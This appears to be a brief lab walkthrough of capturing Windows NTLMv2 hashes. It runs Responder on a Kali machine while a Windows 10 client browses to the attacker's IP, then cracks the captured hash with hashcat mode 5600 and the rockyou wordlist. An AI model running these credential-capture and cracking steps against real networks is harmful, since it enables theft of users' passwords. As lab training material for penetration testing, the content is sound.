On Kali:

```
responder -I eth0 -dwv
```

On Windows 10 Client:

- Browse to file explorer
- type `\\<kali_ip>`

On Kali:

- Observe the hashes retrieved for the user.

Additional (Hashcat):

- Save hash to a file

`hashcat -m 5600 /home/kali/Desktop/Hashes rocket-hash-ntlm /usr/share/wordlists/rockyou.txt`